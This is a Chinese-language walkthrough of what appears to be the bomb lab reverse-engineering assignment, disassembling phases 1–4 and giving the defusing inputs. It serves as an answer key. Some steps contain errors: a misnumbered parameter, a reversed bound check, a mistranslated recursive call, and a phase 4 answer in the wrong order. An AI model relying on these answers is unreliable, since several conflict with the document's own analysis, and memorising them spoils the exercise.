<h1 id="2-Puzzle"><a href="#2-Puzzle" class="headerlink" title="2. Puzzle"></a>2. Puzzle</h1><h2 id="2-1-Phase-1"><a href="#2-1-Phase-1" class="headerlink" title="2.1 Phase 1"></a>2.1 Phase 1</h2><p>首先使用 <code>objdump -d bomb</code> 获得bomb文件的反编译代码。可以在 <code>0000000000400da0 &lt;main&gt;:</code>函数中找到 <code>phase_1</code> 的函数入口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>

<p>跳转到 <code>phase_1</code> 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>这段代码只是在比对两个值。我们可以看到 <code>$0x402400</code> 被移动到了 <code>%esi</code> 中，其实我们已经可以猜到这个就是答案，再gdb中查看这个地址里面存储的string，得到 <code>Border relations with Canada have never been better.</code> 。至此，第一个puzzle解除。</p>
<p>我们在这里再分析一下 <code>callq  401338 &lt;strings_not_equal&gt;</code> 函数。下面使用 <code>--</code> 表示注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401338 &lt;strings_not_equal&gt;: ;-- input is(char* a, char*b)</span><br><span class="line">  401338:	41 54                	push   %r12; -- callee saved</span><br><span class="line">  40133a:	55                   	push   %rbp; -- callee saved</span><br><span class="line">  40133b:	53                   	push   %rbx; -- callee saved</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx; -- parameter1 type:char*</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp; -- parameter2 type:char*</span><br><span class="line">  401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d; --%r12d len(char* a)</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d --% last len is store in %eax</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">  40135f:	84 c0                	test   %al,%al</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;</span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;</span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)</span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;</span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">  40137d:	84 c0                	test   %al,%al</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;; --char loop</span><br><span class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax; -- return not eql is true</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>本函数先是判断两个字符串的长度，然后再逐字符判断，如果两个字符串的长度不相等，或者其中有字符不相等，那么返回 <code>true</code> ，反之返回 <code>false</code> 。</p>
<h2 id="2-2-phase-2"><a href="#2-2-phase-2" class="headerlink" title="2.2 phase 2"></a>2.2 phase 2</h2><p>同理，找到 <code>phase_2</code> 的函数入口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>这段代码实际上是一个非常简单的循环。可以看到在 callee-saved 参数后，申请了 28 byte的内存。之后把栈顶的 <code>%rsp mov to %rsi</code> 是因为在之后 call 的函数中又会覆盖掉 <code>%rsp</code> 现有的参数，所以先做了备份，然后进入了 <code>read_six_number</code>函数，这个函数显然是读入6个数字。我们进入到这个函数具体看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>我们首先看到有一个 <code>sscanf</code> 函数，那么按照惯例，其上的 <code>%esi</code> 应该是传入这个函数的参数，在gdb中打印这个参数看到 <code>&quot;%d %d %d %d %d %d&quot;</code> 显然。然后我们分析这6个数字在 stack 和 register 中是怎么存储的。</p>
<p>首先这里的 <code>%rsi</code> 是从 <code>phase_2</code> 这个函数中得到的参数，其参数是 <code>phase_2</code> 函数中申请到的 stack top。</p>
<ul>
<li><code>%rdx</code> 存储的实际上是  <code>phase_2</code> 的 stack top。存储的是第一个参数</li>
<li><code>%rcx</code> 是 stack top + 0x4。存储第二个参数。显然这里的参数类型是 int。</li>
<li><code>%r8</code> 是 stack top + 0x8。存储第三个参数。</li>
<li><code>%r9</code> 是 stack top + 0xc。存储第四个参数。</li>
</ul>
<p>之后的两个值需要压栈传参。</p>
<ul>
<li>stack top + 0x10。在 <code>read_six_numbers</code> 函数中是 <code>%rsp</code> 。存储第五个参数。</li>
<li>stack top + 0x14。在 <code>read_six_numbers</code> 函数中是 <code>%rsp + 0x8</code>  。存储第二个参数。</li>
</ul>
<p>函数之后再接受了 <code>sscanf</code> 的参数，得到参数数量，并作比较。</p>
<p>再看 <code>phase_2</code> 函数就非常简单了，转换为C语言表述如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((*rsp[<span class="number">0</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> ((*rsp[i+<span class="number">1</span>])!=(*rsp[i]*<span class="number">2</span>)) explode_bomb();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据这个思路，得到最终的结果为 <code>1,2,4,8,16,32</code> </p>
<h2 id="2-3-phase-3"><a href="#2-3-phase-3" class="headerlink" title="2.3 phase 3"></a>2.3 phase 3</h2><p>同理，找到 <code>phase_3</code> 的函数入口</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>43 &lt;phase_3&gt;:</span><br><span class="line">  <span class="number">400f</span>43:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>          	sub    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">400f</span>47:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       	lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">400f</span>4c:	<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       	lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">400f</span>51:	be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4025cf</span>,%esi</span><br><span class="line">  <span class="number">400f</span>56:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400f</span>5b:	e8 <span class="number">90</span> fc ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">400f</span>60:	<span class="number">83</span> f8 <span class="number">01</span>             	cmp    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">400f</span>63:	<span class="number">7f</span> <span class="number">05</span>                	jg     <span class="number">400f</span>6a &lt;phase_3+<span class="number">0x27</span>&gt;</span><br><span class="line">  <span class="number">400f</span>65:	e8 d0 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400f</span>6a:	<span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span> <span class="number">07</span>       	cmpl   $<span class="number">0x7</span>,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">400f</span>6f:	<span class="number">77</span> <span class="number">3</span>c                	ja     <span class="number">400f</span>ad &lt;phase_3+<span class="number">0x6a</span>&gt;</span><br><span class="line">  <span class="number">400f</span>71:	<span class="number">8b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rsp),%eax</span><br><span class="line">  <span class="number">400f</span>75:	ff <span class="number">24</span> c5 <span class="number">70</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span> 	jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)</span><br><span class="line">  <span class="number">400f</span>7c:	b8 cf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0xcf</span>,%eax  -- 当第一个数为<span class="number">0</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>81:	eb <span class="number">3b</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>83:	b8 c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x2c3</span>,%eax -- 当第一个数为<span class="number">2</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>88:	eb <span class="number">34</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>8a:	b8 <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x100</span>,%eax -- 当第一个数为<span class="number">3</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>8f:	eb <span class="number">2</span>d                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>91:	b8 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x185</span>,%eax -- 当第一个数为<span class="number">4</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>96:	eb <span class="number">26</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>98:	b8 ce <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0xce</span>,%eax  -- 当第一个数为<span class="number">5</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>9d:	eb <span class="number">1f</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>9f:	b8 aa <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x2aa</span>,%eax -- 当第一个数为<span class="number">6</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>a4:	eb <span class="number">18</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>a6:	b8 <span class="number">47</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x147</span>,%eax</span><br><span class="line">  <span class="number">400f</span>ab:	eb <span class="number">11</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>ad:	e8 <span class="number">88</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400f</span>b2:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400f</span>b7:	eb <span class="number">05</span>                	jmp    <span class="number">400f</span>be &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">400f</span>b9:	b8 <span class="number">37</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x137</span>,%eax -- 当第一个数为<span class="number">1</span>时跳转到此处</span><br><span class="line">  <span class="number">400f</span>be:	<span class="number">3b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">0</span>c          	cmp    <span class="number">0xc</span>(%rsp),%eax</span><br><span class="line">  <span class="number">400f</span>c2:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">400f</span>c9 &lt;phase_3+<span class="number">0x86</span>&gt;</span><br><span class="line">  <span class="number">400f</span>c4:	e8 <span class="number">71</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400f</span>c9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>          	add    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">400f</span>cd:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>首先，栈申请了 18 byte。盲猜用 <code>sscanf</code> 传入了两个 int 类型的参数，使用 gdb 打印 <code>0x4025cf</code> 位置的内存，得到 <code>&quot;%d %d&quot;</code> ，正确。接下来做了一个判断，判断传进来的参数量。然后判断了传进来的第一个参数是否小于7，跳转跳转到<code>0x402470+8*%eax</code>地址所存储的地址。发现 <code>%eax</code> 与输入有关。比如我现在的 <code>%rax</code> 是 0，那么跳转的地址就是 <code>0x402470</code> 中存储的值 0xf7c，把 <code>0xcf</code> 写入到 <code>%eax</code> 中进行比较。这里有多个答案，第一个数从0→6都行，后面的数按照这个跳转表来就行。</p>
<h2 id="2-4-phase-4"><a href="#2-4-phase-4" class="headerlink" title="2.4 phase 4"></a>2.4 phase 4</h2><p>同理，找到 <code>phase_4</code> 的函数入口</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000000040100</span>c &lt;phase_4&gt;:</span><br><span class="line">  <span class="number">40100</span>c:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>          	sub    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">401010</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       	lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">401015</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       	lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">40101</span>a:	be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4025cf</span>,%esi</span><br><span class="line">  <span class="number">40101f</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401024</span>:	e8 c7 fb ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">401029</span>:	<span class="number">83</span> f8 <span class="number">02</span>             	cmp    $<span class="number">0x2</span>,%eax</span><br><span class="line">  <span class="number">40102</span>c:	<span class="number">75</span> <span class="number">07</span>                	jne    <span class="number">401035</span> &lt;phase_4+<span class="number">0x29</span>&gt;</span><br><span class="line">  <span class="number">40102</span>e:	<span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span> <span class="number">0</span>e       	cmpl   $<span class="number">0xe</span>,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401033</span>:	<span class="number">76</span> <span class="number">05</span>                	jbe    <span class="number">40103</span>a &lt;phase_4+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">401035</span>:	e8 <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40103</span>a:	ba <span class="number">0</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0xe</span>,%edx</span><br><span class="line">  <span class="number">40103f</span>:	be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%esi</span><br><span class="line">  <span class="number">401044</span>:	<span class="number">8b</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rsp),%edi</span><br><span class="line">  <span class="number">401048</span>:	e8 <span class="number">81</span> ff ff ff       	callq  <span class="number">400f</span>ce &lt;func4&gt;</span><br><span class="line">  <span class="number">40104</span>d:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">40104f</span>:	<span class="number">75</span> <span class="number">07</span>                	jne    <span class="number">401058</span> &lt;phase_4+<span class="number">0x4c</span>&gt;</span><br><span class="line">  <span class="number">401051</span>:	<span class="number">83</span> <span class="number">7</span>c <span class="number">24</span> <span class="number">0</span>c <span class="number">00</span>       	cmpl   $<span class="number">0x0</span>,<span class="number">0xc</span>(%rsp)</span><br><span class="line">  <span class="number">401056</span>:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">40105</span>d &lt;phase_4+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401058</span>:	e8 dd <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40105</span>d:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>          	add    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">401061</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><code>sscanf</code> 读入了 <code>%d %d</code> 到 <code>%rdx %rcx</code> ，假设读入的两个参数是 <code>a,b</code> 。</p>
<p>用c语言描述这个函数就是:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phase_4</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a, b;</span><br><span class="line">	<span class="keyword">int</span> c = <span class="built_in">sscanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">	<span class="keyword">if</span> (c != <span class="number">2</span>)&#123;explode_bomb();&#125;</span><br><span class="line">	<span class="keyword">if</span> (a &lt;= <span class="number">0xe</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> fans = func4(a, <span class="number">0x0</span>, <span class="number">0xe</span>);</span><br><span class="line">		<span class="keyword">if</span> (fans != <span class="number">0</span> || b != <span class="number">0</span>)&#123;</span><br><span class="line">			explode_bomb();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		explode_bomb();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明 fans 和 输入的 b 都必须是 0。如果 14 ≤ a，跳转到 <code>func4</code> ， <code>func4</code> 的入口：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>ce &lt;func4&gt;:</span><br><span class="line">  <span class="number">400f</span>ce:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">400f</span>d2:	<span class="number">89</span> d0                	mov    %edx,%eax</span><br><span class="line">  <span class="number">400f</span>d4:	<span class="number">29</span> f0                	sub    %esi,%eax</span><br><span class="line">  <span class="number">400f</span>d6:	<span class="number">89</span> c1                	mov    %eax,%ecx</span><br><span class="line">  <span class="number">400f</span>d8:	c1 e9 <span class="number">1f</span>             	shr    $<span class="number">0x1f</span>,%ecx</span><br><span class="line">  <span class="number">400f</span>db:	<span class="number">01</span> c8                	add    %ecx,%eax</span><br><span class="line">  <span class="number">400f</span>dd:	d1 f8                	sar    %eax</span><br><span class="line">  <span class="number">400f</span>df:	<span class="number">8</span>d <span class="number">0</span>c <span class="number">30</span>             	lea    (%rax,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  <span class="number">400f</span>e2:	<span class="number">39</span> f9                	cmp    %edi,%ecx</span><br><span class="line">  <span class="number">400f</span>e4:	<span class="number">7</span>e <span class="number">0</span>c                	jle    <span class="number">400f</span>f2 &lt;func4+<span class="number">0x24</span>&gt;</span><br><span class="line">  <span class="number">400f</span>e6:	<span class="number">8</span>d <span class="number">51</span> ff             	lea    <span class="number">-0x1</span>(%rcx),%edx</span><br><span class="line">  <span class="number">400f</span>e9:	e8 e0 ff ff ff       	callq  <span class="number">400f</span>ce &lt;func4&gt;</span><br><span class="line">  <span class="number">400f</span>ee:	<span class="number">01</span> c0                	add    %eax,%eax</span><br><span class="line">  <span class="number">400f</span>f0:	eb <span class="number">15</span>                	jmp    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">400f</span>f2:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400f</span>f7:	<span class="number">39</span> f9                	cmp    %edi,%ecx</span><br><span class="line">  <span class="number">400f</span>f9:	<span class="number">7</span>d <span class="number">0</span>c                	jge    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">400f</span>fb:	<span class="number">8</span>d <span class="number">71</span> <span class="number">01</span>             	lea    <span class="number">0x1</span>(%rcx),%esi</span><br><span class="line">  <span class="number">400f</span>fe:	e8 cb ff ff ff       	callq  <span class="number">400f</span>ce &lt;func4&gt;</span><br><span class="line">  <span class="number">401003</span>:	<span class="number">8</span>d <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>          	lea    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401007</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">40100b</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>用c语言描述 <code>func4</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// edi-&gt;a, esi-&gt;b, edx-&gt;c</span></span><br><span class="line"><span class="comment">// the rules of X86-64 conventional set %rdi, %rsi, %rdx as 1-&gt;3 parameters&#x27; register.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ans = c - b;</span><br><span class="line">	<span class="keyword">int</span> tmp = ans &gt;&gt; <span class="number">31</span>;  <span class="comment">// tmp is register %ecx in func4.</span></span><br><span class="line">	ans = (tmp + ans) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	tmp = ans + b;</span><br><span class="line">	<span class="keyword">if</span> (a &gt;= tmp)&#123;</span><br><span class="line">		ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (a &lt;= tmp)&#123;</span><br><span class="line">			<span class="keyword">return</span> ans;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			b = c + <span class="number">1</span>;</span><br><span class="line">			ans = func4(a, b, c);</span><br><span class="line">			ans = <span class="number">2</span> * ans + <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">return</span> ans;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		c = tmp - <span class="number">1</span>;</span><br><span class="line">		ans = func4(a, b, c);</span><br><span class="line">		<span class="keyword">return</span> ans * <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了让输出是 0 ，当 tmp = a 时返回的 ans=0 ，因为 b = 0x0，c = 0xe，tmp = 7 = ans</p>
<p>所以最终的答案是 <code>0 7</code></p>
